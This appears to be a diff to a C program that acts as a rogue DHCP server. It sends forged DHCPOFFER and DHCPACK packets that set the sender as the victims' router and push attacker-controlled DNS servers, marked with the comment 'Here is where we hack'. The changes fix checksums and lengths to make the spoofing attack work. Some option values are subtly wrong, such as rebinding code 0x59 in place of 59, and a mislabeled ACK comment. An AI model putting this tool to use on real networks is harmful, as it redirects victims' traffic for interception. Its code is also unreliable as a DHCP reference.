@@ -19,6 +19,7 @@ void print_dhcp_rcv_packet();
 void print_dhcp_send_packet();
 
 const uint8_t dhcp_magic_cookie[4] = {0X63, 0X82, 0X53, 0X63};
+char broadcast_mac[6] =	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 const char* dhcp_message_types[19] = {"", DHCP_DISCOVER_NAME, "DHCPOFFER", DHCP_REQUEST_NAME, "DHCPDECLINE", "DHCPACK",
 "DHCPNAK", "DHCPRELEASE", "DHCPINFORM", "DHCPFORCERENEW", "DHCPLEASEQUERY", "DHCPLEASEUNASSIGNED", 
 "DHCPLEASEUNKNOWN", "DHCPLEASEACTIVE", "DHCPBULKLEASEQUERY", "DHCPLEASEQUERYDONE", 
@@ -40,7 +41,7 @@ uint8_t rcv_buffer[ETH_LEN];
 struct eth_frame_s *raw_rcv = (struct eth_frame_s *)&rcv_buffer;
 struct dhcp_message *rcv_dhcp = (struct dhcp_message *)&rcv_buffer[42];
 
-uint8_t send_buffer[360];
+uint8_t send_buffer[347];
 struct eth_frame_s *raw_send = (struct eth_frame_s *)&send_buffer;
 struct dhcp_message *send_dhcp = (struct dhcp_message *)&send_buffer[42];
 
@@ -89,22 +90,25 @@ void build_offer_packet()
 	raw_send->ethernet.eth_type = htons(ETH_P_IP);
 
     // IP header
-	int length = 328;
+	int ip_length = 333;
 	raw_send->ip.ver = 0x45;
-	raw_send->ip.tos = 0x00;
-	raw_send->ip.len = htons(length);
+	raw_send->ip.tos = 0;
+	raw_send->ip.len = htons(ip_length);
 	raw_send->ip.id = htons(0x00);
 	raw_send->ip.off = htons(0x00);
 	raw_send->ip.ttl = 50;
 	raw_send->ip.proto = 0X11;
-	raw_send->ip.sum = htons(0x0000); 
+	raw_send->ip.sum = 0;
 	inet_aton(interface_ip, &raw_send->ip.src);
     inet_aton(IP_BROADCAST, &raw_send->ip.dst);
+	raw_send->ip.sum = in_cksum((unsigned short*) &raw_send->ip, 20); 
+
 
     // UDP header
+	int udp_length = 313;
     raw_send->udp.src_port = htons(DHCP_PORT);
     raw_send->udp.dst_port = htons(DHCP_PORT_2);
-   	raw_send->udp.udp_len = htons(0X134);
+   	raw_send->udp.udp_len = htons(udp_length);
     raw_send->udp.udp_chksum = 0;
     
 	// DHCP message
@@ -114,7 +118,7 @@ void build_offer_packet()
     send_dhcp->hops = 0; 
     send_dhcp->xid = rcv_dhcp->xid;
     send_dhcp->sec = 0;
-    send_dhcp->flags = 0;
+    send_dhcp->flags = htons(0x0000);
 	inet_aton("0.0.0.0", &send_dhcp->ciaddr);
 	inet_aton(IP_DEST_PLACEHOLDER, &send_dhcp->yiaddr);
 	inet_aton(interface_ip, &send_dhcp->siaddr);
@@ -132,72 +136,68 @@ void build_offer_packet()
 	send_dhcp->options[5] = 1;      
 	send_dhcp->options[6] = 2;      // MESSAGE TYPE 2: OFFER
 
-    // Define Subnet Mask
-    send_dhcp->options[7] = 1;      
-    send_dhcp->options[8] = 4;
-    inet_aton("255.255.255.0", &send_dhcp->options[9]);
+	// Define DHCP Server ID
+	send_dhcp->options[7] = 54;
+	send_dhcp->options[8] = 4;
+    inet_aton(interface_ip, &send_dhcp->options[9]);
 
-    // Define timezone offset
-	send_dhcp->options[13] = 2;
-	send_dhcp->options[14] = 4;
-    send_dhcp->options[15] = 0;
-    send_dhcp->options[16] = 0;
-	send_dhcp->options[17] = 0;
-	send_dhcp->options[18] = 0;
-
-    // Define gateway
-	send_dhcp->options[19] = 3;
-	send_dhcp->options[20] = 4;
-    inet_aton(interface_ip, &send_dhcp->options[21]);
-
-    // Define IP TTL
-	send_dhcp->options[25] = 23;
-	send_dhcp->options[26] = 1;
-	send_dhcp->options[27] = 0X40;
-
-    // Define IP address lease time
+	// Define IP address lease time
     // 3600 seconds, 60 minutes
-	send_dhcp->options[28] = 51;
-	send_dhcp->options[29] = 4;
-	send_dhcp->options[30] = 0;
-	send_dhcp->options[31] = 0;
-	send_dhcp->options[32] = 0X0E;
-	send_dhcp->options[33] = 0X10;
+	send_dhcp->options[13] = 51;
+	send_dhcp->options[14] = 4;
+	send_dhcp->options[15] = 0;
+	send_dhcp->options[16] = 0;
+	send_dhcp->options[17] = 0X0E;
+	send_dhcp->options[18] = 0X10;
 
-    // Define DHCP Server ID
-	send_dhcp->options[34] = 54;
-	send_dhcp->options[35] = 4;
-    inet_aton(interface_ip, &send_dhcp->options[36]);
+	// Define DHCP renewal time
+	send_dhcp->options[19] = 58;
+	send_dhcp->options[20] = 4;
+	send_dhcp->options[21] = 0;
+	send_dhcp->options[22] = 0;
+	send_dhcp->options[23] = 0X07;
+	send_dhcp->options[24] = 0X08;
+
+	// Define DHCP rebinding time
+    // 3150 seconds, 52.5 minutes
+	send_dhcp->options[25] = 0X59;
+	send_dhcp->options[26] = 4;
+	send_dhcp->options[27] = 0;
+	send_dhcp->options[28] = 0;
+	send_dhcp->options[29] = 0X0C;
+	send_dhcp->options[30] = 0X4E;
+
+    // Define Subnet Mask
+    send_dhcp->options[31] = 1;      
+    send_dhcp->options[32] = 4;
+    inet_aton("255.255.255.0", &send_dhcp->options[33]);
+
+	// Define Broadcast Address
+	send_dhcp->options[37] = 28;      
+    send_dhcp->options[38] = 4;
+    inet_aton("192.168.0.255", &send_dhcp->options[39]);
+
+    // Define Router
+	send_dhcp->options[43] = 3;
+	send_dhcp->options[44] = 4;
+    inet_aton(interface_ip, &send_dhcp->options[45]);
 
     // Define DNS Servers Addresses
     // Here is where we hack 
-	send_dhcp->options[40] = 6;
-	send_dhcp->options[41] = 8;
+	send_dhcp->options[49] = 6;
+	send_dhcp->options[50] = 8;
 	// DNS Addresses	
-    inet_aton(FAKE_DNS_1, &send_dhcp->options[42]);
-    inet_aton(FAKE_DNS_2, &send_dhcp->options[46]);
+    inet_aton(FAKE_DNS_1, &send_dhcp->options[51]);
+    inet_aton(FAKE_DNS_2, &send_dhcp->options[55]);
 
-    // Define DHCP renewal time
-    // 1800 seconds, 30 minutes
-	send_dhcp->options[50] = 58;
-	send_dhcp->options[51] = 4;
-	send_dhcp->options[52] = 0;
-	send_dhcp->options[53] = 0;
-	send_dhcp->options[54] = 0X07;
-	send_dhcp->options[55] = 0X08;
-
-    // Define DHCP rebinding time
-    // 3150 seconds, 52.5 minutes
-	send_dhcp->options[56] = 0X3b;
-	send_dhcp->options[57] = 4;
-	send_dhcp->options[58] = 0;
-	send_dhcp->options[59] = 0;
-	send_dhcp->options[60] = 0X0C;
-	send_dhcp->options[61] = 0X4E;
+	// Client Identifier 
+	send_dhcp->options[59] = 61;
+	send_dhcp->options[60] = 7;
+	send_dhcp->options[61] = 1;
+	memcpy(&send_dhcp->options[62], mac_dest, 6);
 
     // End of options
-	send_dhcp->options[62] = 255;
-	send_dhcp->options[63] = 0;
+	send_dhcp->options[68] = 255;
 
 }
 
@@ -216,22 +216,25 @@ void build_ack_packet()
 	raw_send->ethernet.eth_type = htons(ETH_P_IP);
 
     // IP header
-	int length = 328;
+	int ip_length = 333;
 	raw_send->ip.ver = 0x45;
-	raw_send->ip.tos = 0x00;
-	raw_send->ip.len = htons(length);
+	raw_send->ip.tos = 0;
+	raw_send->ip.len = htons(ip_length);
 	raw_send->ip.id = htons(0x00);
 	raw_send->ip.off = htons(0x00);
 	raw_send->ip.ttl = 50;
 	raw_send->ip.proto = 0X11;
-	raw_send->ip.sum = htons(0x0000); 
+	raw_send->ip.sum = 0;
 	inet_aton(interface_ip, &raw_send->ip.src);
     inet_aton(IP_BROADCAST, &raw_send->ip.dst);
+	raw_send->ip.sum = in_cksum((unsigned short*) &raw_send->ip, 20); 
+
 
     // UDP header
+	int udp_length = 313;
     raw_send->udp.src_port = htons(DHCP_PORT);
     raw_send->udp.dst_port = htons(DHCP_PORT_2);
-   	raw_send->udp.udp_len = htons(0X134);
+   	raw_send->udp.udp_len = htons(udp_length);
     raw_send->udp.udp_chksum = 0;
     
 	// DHCP message
@@ -241,7 +244,7 @@ void build_ack_packet()
     send_dhcp->hops = 0; 
     send_dhcp->xid = rcv_dhcp->xid;
     send_dhcp->sec = 0;
-    send_dhcp->flags = 0;
+    send_dhcp->flags = htons(0x0000);
 	inet_aton("0.0.0.0", &send_dhcp->ciaddr);
 	inet_aton(IP_DEST_PLACEHOLDER, &send_dhcp->yiaddr);
 	inet_aton(interface_ip, &send_dhcp->siaddr);
@@ -257,71 +260,70 @@ void build_ack_packet()
     // Define DHCP message type
     send_dhcp->options[4] = 53;   
 	send_dhcp->options[5] = 1;      
-	send_dhcp->options[6] = 5;      // MESSAGE TYPE 5 = ACK
+	send_dhcp->options[6] = 5;      // MESSAGE TYPE 2: ACK
+
+	// Define DHCP Server ID
+	send_dhcp->options[7] = 54;
+	send_dhcp->options[8] = 4;
+    inet_aton(interface_ip, &send_dhcp->options[9]);
+
+	// Define IP address lease time
+    // 3600 seconds, 60 minutes
+	send_dhcp->options[13] = 51;
+	send_dhcp->options[14] = 4;
+	send_dhcp->options[15] = 0;
+	send_dhcp->options[16] = 0;
+	send_dhcp->options[17] = 0X0E;
+	send_dhcp->options[18] = 0X10;
+
+	// Define DHCP renewal time
+	send_dhcp->options[19] = 58;
+	send_dhcp->options[20] = 4;
+	send_dhcp->options[21] = 0;
+	send_dhcp->options[22] = 0;
+	send_dhcp->options[23] = 0X07;
+	send_dhcp->options[24] = 0X08;
+
+	// Define DHCP rebinding time
+    // 3150 seconds, 52.5 minutes
+	send_dhcp->options[25] = 0X59;
+	send_dhcp->options[26] = 4;
+	send_dhcp->options[27] = 0;
+	send_dhcp->options[28] = 0;
+	send_dhcp->options[29] = 0X0C;
+	send_dhcp->options[30] = 0X4E;
 
     // Define Subnet Mask
-    send_dhcp->options[7] = 1;      
-    send_dhcp->options[8] = 4;
-    inet_aton("255.255.255.0", &send_dhcp->options[9]);
+    send_dhcp->options[31] = 1;      
+    send_dhcp->options[32] = 4;
+    inet_aton("255.255.255.0", &send_dhcp->options[33]);
 
-    // Define timezone offset
-	send_dhcp->options[13] = 2;
-	send_dhcp->options[14] = 4;
-    send_dhcp->options[15] = 0;
-    send_dhcp->options[16] = 0;
-	send_dhcp->options[17] = 0;
-	send_dhcp->options[18] = 0;
+	// Define Broadcast Address
+	send_dhcp->options[37] = 28;      
+    send_dhcp->options[38] = 4;
+    inet_aton("192.168.0.255", &send_dhcp->options[39]);
 
-    // Define gateway
-	send_dhcp->options[19] = 3;
-	send_dhcp->options[20] = 4;
-    inet_aton(interface_ip, &send_dhcp->options[21]);
-
-    // Define IP TTL
-	send_dhcp->options[25] = 23;
-	send_dhcp->options[26] = 1;
-	send_dhcp->options[27] = 64;
-
-    // Define IP address lease time
-    // 3600 seconds, 60 minutes
-	send_dhcp->options[28] = 51;
-	send_dhcp->options[29] = 4;
-	send_dhcp->options[30] = htonl(3600);
-
-    // Define DHCP Server ID
-	send_dhcp->options[34] = 54;
-	send_dhcp->options[35] = 4;
-    inet_aton(interface_ip, &send_dhcp->options[36]);
+    // Define Router
+	send_dhcp->options[43] = 3;
+	send_dhcp->options[44] = 4;
+    inet_aton(interface_ip, &send_dhcp->options[45]);
 
     // Define DNS Servers Addresses
     // Here is where we hack 
-	send_dhcp->options[40] = 6;
-	send_dhcp->options[41] = 8;
-	//DNS Addresses	
-    inet_aton(FAKE_DNS_1, &send_dhcp->options[42]);
-    inet_aton(FAKE_DNS_2, &send_dhcp->options[46]);
+	send_dhcp->options[49] = 6;
+	send_dhcp->options[50] = 8;
+	// DNS Addresses	
+    inet_aton(FAKE_DNS_1, &send_dhcp->options[51]);
+    inet_aton(FAKE_DNS_2, &send_dhcp->options[55]);
 
-    // Define DHCP renewal time
-    // 1800 seconds, 30 minutes
-	send_dhcp->options[50] = 58;
-	send_dhcp->options[51] = 4;
-	send_dhcp->options[52] = 0;
-	send_dhcp->options[53] = 0;
-	send_dhcp->options[54] = 0X07;
-	send_dhcp->options[55] = 0X08;
-
-    // Define DHCP rebinding time
-    // 3150 seconds, 52.5 minutes
-	send_dhcp->options[56] = 59;
-	send_dhcp->options[57] = 4;
-	send_dhcp->options[58] = 0;
-	send_dhcp->options[59] = 0;
-	send_dhcp->options[60] = 0X0C;
-	send_dhcp->options[61] = 0X4E;
+	// Client Identifier 
+	send_dhcp->options[59] = 61;
+	send_dhcp->options[60] = 7;
+	send_dhcp->options[61] = 1;
+	memcpy(&send_dhcp->options[62], mac_dest, 6);
 
     // End of options
-	send_dhcp->options[62] = 255;
-	send_dhcp->options[63] = 0;
+	send_dhcp->options[68] = 255;
 
 }
 
@@ -375,7 +377,7 @@ int main(int argc, char *argv[])
                     print_dhcp_send_packet();
 
 					memcpy(socket_address.sll_addr, mac_dest, 6);
-					if (sendto(sockfd, (char *) send_buffer, sizeof(send_buffer), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+					if (sendto(sockfd, (char *) send_buffer, 347, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 					    printf("Error sending packet through socket. The reported error is %s\n", strerror(errno));
 					else 
 					    printf("DHCPOFFER sent\n\n");
@@ -389,7 +391,7 @@ int main(int argc, char *argv[])
                     print_dhcp_send_packet();
 
 					memcpy(socket_address.sll_addr, mac_dest, 6);
-					if (sendto(sockfd, (char *) send_buffer, sizeof(send_buffer), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+					if (sendto(sockfd, (char *) send_buffer, 347, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 					    printf("Error sending packet through socket. The reported error is %s\n", strerror(errno));
 					else 
 					    printf("DHCPACK packet sent\n\n");
@@ -480,7 +482,7 @@ void print_dhcp_send_packet()
     printf("Gateway ip: %d.%d.%d.%d\n", send_dhcp->giaddr[0], send_dhcp->giaddr[1], send_dhcp->giaddr[2], send_dhcp->giaddr[3]);
     printf("IP Packet Source: %d.%d.%d.%d\n", raw_send->ip.src[0], raw_send->ip.src[1], raw_send->ip.src[2], raw_send->ip.src[3]);
     printf("IP Packet Dest: %d.%d.%d.%d\n", raw_send->ip.dst[0], raw_send->ip.dst[1], raw_send->ip.dst[2], raw_send->ip.dst[3]);
-	printf("DNS 1: %d.%d.%d.%d\n", send_dhcp->options[42], send_dhcp->options[43], send_dhcp->options[44], send_dhcp->options[45]);
-	printf("DNS 2: %d.%d.%d.%d\n\n", send_dhcp->options[46], send_dhcp->options[47], send_dhcp->options[48], send_dhcp->options[49]);
+	printf("DNS 1: %d.%d.%d.%d\n", send_dhcp->options[51], send_dhcp->options[52], send_dhcp->options[53], send_dhcp->options[54]);
+	printf("DNS 2: %d.%d.%d.%d\n\n", send_dhcp->options[55], send_dhcp->options[56], send_dhcp->options[57], send_dhcp->options[58]);
 
 }
